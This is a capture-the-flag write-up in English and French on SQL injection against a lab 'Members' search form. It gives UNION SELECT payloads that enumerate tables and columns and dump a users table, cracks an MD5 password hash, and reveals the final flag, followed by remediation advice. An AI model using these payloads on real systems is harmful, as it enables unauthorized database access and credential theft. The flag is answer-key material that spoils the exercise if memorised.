<div align="center">

# SQL Injection - Users
### Extracting user credentials via SQL Injection

</div>

---

## 🇬🇧 English

<details>
<summary><b>📖 Click to expand/collapse English version</b></summary>

### 📖 Definition

**SQL Injection (SQLi)** is a code injection technique where an attacker can execute malicious SQL statements that control a web application's database server. This allows access to sensitive data, such as private customer details, passwords, and other authentication credentials.

### 📖 Approach

I targeted the "Members" search form. After confirming the vulnerability with `1 OR 1=1`, I proceeded to map the database. I identified the `users` table (`0x7573657273` in hex).

Dump columns revealed `Commentaire` and `countersign` as interesting fields. I extracted the data and found a specific user with:
- Decrypt this password -> then lower all the char. Sh256 on it...
- MD5 Hash: `5ff9d0165b4f92b14994e5c685cdce28`

MD5(`5ff9d0165b4f92b14994e5c685cdce28`) -> `FortyTwo`.
Lowercase -> `fortytwo`.
SHA256(`fortytwo`) -> Flag.

**Payloads used:**
1. List tables:
   `-1 UNION SELECT table_name, NULL FROM information_schema.tables`
2. List columns:
   `-1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 0x7573657273`
3. Dump data:
   `-1 UNION SELECT Commentaire, countersign FROM users`

**Flag:** `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`

### 🛡️ Remediation

To prevent SQL Injection:
- **Prepared Statements**: Crucial for preventing SQLi.
- **ORM**: Use an Object-Relational Mapper (ORM) that handles query construction safely.
- **WAF**: A Web Application Firewall can help detect and block SQLi attacks.

### 🔗 Resources

- [OWASP - SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [CrackStation](https://crackstation.net/)
- [SHA256 Online](https://emn178.github.io/online-tools/sha256.html)

</details>

---

## 🇫🇷 Français

<details>
<summary><b>📖 Cliquez pour développer/réduire la version française</b></summary>

### 📖 Définition

L'**Injection SQL (SQLi)** est une technique d'injection de code où un attaquant peut exécuter des instructions SQL malveillantes qui contrôlent le serveur de base de données d'une application web. Cela permet d'accéder à des données sensibles, comme les détails des clients ou les mots de passe.

### 📖 Approche

J'ai ciblé le formulaire "Members". Après avoir confirmé la faille avec `1 OR 1=1`, j'ai cartographié la base. J'ai identifié la table `users` (`0x7573657273` en hex).

Les colonnes `Commentaire` et `countersign` ont révélé un utilisateur spécifique avec :
- Consigne : Déchiffrer ce mot de passe -> mettre en minuscule -> SHA256...
- Hash MD5 : `5ff9d0165b4f92b14994e5c685cdce28`

MD5(`5ff9d0165b4f92b14994e5c685cdce28`) -> `FortyTwo`.
Minuscule -> `fortytwo`.
SHA256(`fortytwo`) -> Flag.

**Payloads utilisés :**
1. Lister les tables :
   `-1 UNION SELECT table_name, NULL FROM information_schema.tables`
2. Lister les colonnes :
   `-1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 0x7573657273`
3. Extraire les données :
   `-1 UNION SELECT Commentaire, countersign FROM users`

**Flag :** `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`

### 🛡️ Remédiation

Pour corriger cela :
- **Requêtes préparées** : Crucial pour empêcher les injections SQL.
- **ORM** : Utiliser un ORM qui gère la construction des requêtes de manière sécurisée.
- **WAF** : Un pare-feu applicatif web permet de détecter les attaques.

### 🔗 Sources

- [OWASP - SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [CrackStation](https://crackstation.net/)
- [SHA256 Online](https://emn178.github.io/online-tools/sha256.html)

</details>